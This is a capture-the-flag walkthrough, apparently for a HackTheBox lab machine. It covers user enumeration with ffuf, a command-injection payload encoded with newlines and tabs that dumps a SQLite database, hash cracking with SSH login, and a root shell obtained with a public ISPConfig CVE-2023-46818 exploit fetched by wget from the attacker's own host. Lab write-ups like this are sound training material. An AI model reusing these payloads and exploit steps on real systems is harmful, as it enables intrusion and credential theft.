
- we start with a `nmap` scan
```shell
nmap -sC -sV 10.10.11.64
```
![[Pasted image 20250711095515.png]]

- We have the port `80` for http open so that means we have a website so let's open it
![[Pasted image 20250711095604.png]]

- There is not much to see in the site just the 2 pages `register` and `login` 
- We are gonna create an account an login with it![[Pasted image 20250711095719.png]]![[Pasted image 20250711095740.png]]

- We entered on another page `dashboard.php`, where we can upload files with extensions `.pdf, .doc, .docx, .xls, .xlsx, .odt` and the files will be shown on the page under `Your Files` ![[Pasted image 20250711100013.png]]

- In the meantime I had open the `Burp Suite` to investigate the responses and requests
- In the response of `dashboard.php` after I uploaded the file, I see that the file can be found at a link `/view.php?username=test&file=file.pdf`
![[Pasted image 20250711100253.png]]

- There is something interesting about this page `view.php`:
	- If I specify an existing file like `file.pdf`, the file will be downloaded
	- If I specify a file that is not in my list but still with the necessary extensions I can see all available files of my user
![[Pasted image 20250711100557.png]]

- This got me thinking that maybe If I can switch the username maybe I can see all the available files of the user so let's do that 
- I took 2 tests, usernames `test123` and `admin`

- With `test123` it outputs me that the user was not found
![[Pasted image 20250711100843.png]]

- But with username `admin` it worked and we can see that the user `admin` has no files![[Pasted image 20250711100946.png]]

- After some thinking I realized that I can use `ffuf` to check more usernames and see for what username I have files
- I use `ffuf`, having as options my current session Cookie and a filter to filter the common `User not found` response
```shell
ffuf http://nocturnal.htb/view.php\?username=FUZZ\&file=abc.pdf             -w /home/fifi/wordlists/names-lowercase.txt -H "Cookie: PHPSESSID=<Cookie_value>" -fs 2985
```

 - We have another user with files, `amanda` ![[Pasted image 20250711101824.png]]

- Let's see what files does `amanda` has![[Pasted image 20250711101857.png]]

- I download the file and use a tool to view its content [odfviewer](https://odfviewer.nsspot.net/) ![[Pasted image 20250711102226.png]]

- We see that it is a email for `amanda` from the IT team, which changed the `amanda`'s account password, so we take that password and try to enter on her account![[Pasted image 20250711102438.png]]

- In the admin Panel page we have a bunch of `.php` files which are pages for the site ![[Pasted image 20250711102546.png]]

- If we click on them we can see the content of that respective page![[Pasted image 20250711102726.png]]

- On the bottom of the page we can enter a password and create a backup folder with the files in the admin panel page

- At a first look on these pages I found a very essential piece of information:
	- In `dashboard.php` there is a creation of a new database `nocturnal_database.db` at the start of a session
```php
$db = new SQLite3('../nocturnal_databases/nocturnal_database.db');
```
- So maybe we can check the database content somehow

- After a long time of thinking and at a second investigation through this admin panel, I was curious about the password which we input for the backup
- I wanted to see if I can exploit it somehow to input system commands through that form
- In the `admin.php` page I find the functions to take the content of the password form![[Pasted image 20250711103531.png]]
![[Pasted image 20250711103657.png]]

- I can see that there are certain characters that I cannot write in the form
- Also the function `htmlspecialchars()` give me an important clue, because the function is used to convert special characters (spaces, tabs, newline) to HTML entities it prevents me from writing the code in plain text form

- So I have to use special HTML entities
- To do that I have to input the malicious script password from a request in `Burp Suite` 
- After some tries the successful script to get the content is:
```shell
bash -c "sqlite3 /var/www/nocturnal_dabase/nocturnal_database.db .dump"
```
- Encoded:
```UTF-8
password=%0Abash%09-c%09"sqlite3%09/var/www/nocturnal_database/nocturnal_database.db%09.dump"%0A&backup=
```
- where:
	- `%0A` = `\n`, newline character
	- `%09` = `\t`, tab space
![[Pasted image 20250711113957.png]]

- The output is indeed the content of the database from which we can get some users and their respective hashed passwords
```txt
INSERT INTO users VALUES(1,'admin','d725aeba143f575736b07e045d8ceebb'); INSERT INTO users VALUES(2,'amanda','df8b20aa0c935023f99ea58358fb63c4'); INSERT INTO users VALUES(4,'tobias','55c82b1ccd55ab219b3b109b07d5061d'); INSERT INTO users VALUES(6,'kavi','f38cde1654b39fea2bd4f72f1ae4cdda'); INSERT INTO users VALUES(7,'e0Al5','101ad4543a96a7fd84908fd0d802e7db'); INSERT INTO users VALUES(8,'test','cc03e747a6afbbcbf8be7668acfebee5');
```

- We use [CrackStation](https://crackstation.net/) to crack the hashes and we get 2 users with their passwords![[Pasted image 20250711114421.png]]
	- `tobias` - `slowmotionapocalypse`
	- `kavi` - `kavi` - does not work to ssh

- We `ssh` into `tobias` account and get the flag from `user.txt`
```shell
ssh tobias@10.10.11.64
password: slowmotionapocalypse
```

#### Root flag

- We search for basic things like:
	- `sudo -l` to see what we can `sudo`, but no luck in that
	- find files owned by user but they are standard 
	- try installing `linpeas.sh` on the target machine but nothing

- We type `netstat -tulnp` and find that there is another website on port `8080` running on the target  system![[Pasted image 20250711115602.png]]

- I forward the website on my machine on port `8080` with `ssh`
```shell
ssh -L 8080:127.0.0.1:8080 tobias@10.10.11.64
```
- Now by searching for `127.0.0.1:8080` I get an `ISPConfig` website![[Pasted image 20250711115838.png]]

- After some failed combinations of usernames + passwords I get the right ones and I am able to view the `index.php` page:
	- Username: `admin`
	- Password: `slowmotionapocalypse`
![[Pasted image 20250711120208.png]]

- On the `Help` page I find the that the version of the `ISPConfig` is `3.2.10p1`![[Pasted image 20250711122317.png]]

- I search for a vulnerability for this version and I found one `CVE-2023-46818` 
- `CVE-2023-46818` is a vulnerability that take advantage of a PHP code injection vulnerability in `ISPConfig` version `3.2.11` and earlier

- I also found an git repo with an exploit for this vulnerability [CVE-2023-46818-Exploit](https://github.com/blindma1den/CVE-2023-46818-Exploit)
- I clone the repo on my machine then start a python web server and download the exploit on my target
- On my machine
```shell
git clone https://github.com/blindma1den/CVE-2023-46818-Exploit
```
```shell
python3 -m http.server 80
```
- On target machine
```shell
wget http://<your_IP>:80/CVE-2023-46818-Exploit/exploit.py
```

- The exploit needs the `URL`, `user`, `password` of the target website:
```shell
python3 exploit.py http://127.0.0.1:8080 admin slowmotionapocalypse
```
- After we run it we get a shell as the `root` user and we can find the flag in `root.txt`
![[Pasted image 20250711121333.png]]


